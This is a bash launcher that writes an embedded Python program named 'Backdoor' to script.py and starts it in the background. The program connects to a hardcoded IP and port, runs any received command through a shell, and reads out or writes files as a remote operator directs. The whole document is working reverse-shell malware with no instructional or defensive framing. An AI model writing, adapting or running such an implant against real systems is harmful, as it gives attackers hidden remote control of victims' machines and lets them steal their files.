#!/bin/bash

python_script=$(cat <<EOF
#!/usr/bin/env python

import socket
import subprocess
import json
import os
import base64
import sys

DEVNULL = open(os.devnull, 'wb')

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def excute_cmd(self, command):
        return subprocess.check_output(command,  shell=True, stderr=DEVNULL, stdin=DEVNULL)
    
    def change_working_dicrec(self, path):
        os.chdir(path)
        return "[+] Change directory to "+ path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download success."

    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_dicrec(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1]).decode()
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.excute_cmd(command).decode()
            except Exception:
                command_result = "[-] Error command"
            self.reliable_send(command_result)


try:
    my_bd = Backdoor("172.25.210.212", 8888)
    my_bd.run()
except Exception:
    sys.exit()
EOF
)

echo "$python_script" > script.py

python3 script.py &
